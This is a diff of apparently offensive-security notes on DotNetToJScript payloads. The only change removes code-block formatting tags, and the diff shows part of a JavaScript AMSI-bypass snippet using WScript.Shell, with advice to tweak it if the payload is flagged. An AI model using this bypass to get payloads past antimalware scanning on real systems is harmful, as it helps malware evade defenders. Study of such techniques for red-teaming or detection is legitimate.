@@ -68,7 +68,7 @@ Bypassing AMSI highly reduces the detection rate, but DN2JS doesn't provide one 
 
 > NOTE: You must do the bypass **after** the `setversion()` method runs or your payload will break.
 > Credit: [rxwx/bypass.js](https://gist.github.com/rxwx/8955e5abf18dc258fd6b43a3a7f4dbf9) (*although its a pretty well-known bypass*)
-{% code overflow="wrap" %}
+
 ```js
 // 4MS7_BYP455
 var sh = new ActiveXObject('WScript.Shell');
@@ -86,6 +86,5 @@ try{
 	WScript.Quit(1);
 }
 ```
-{% endcode %}
 
 Sometimes the AMSI bypass itself is what gets your payload flagged so feel free to play around with it.
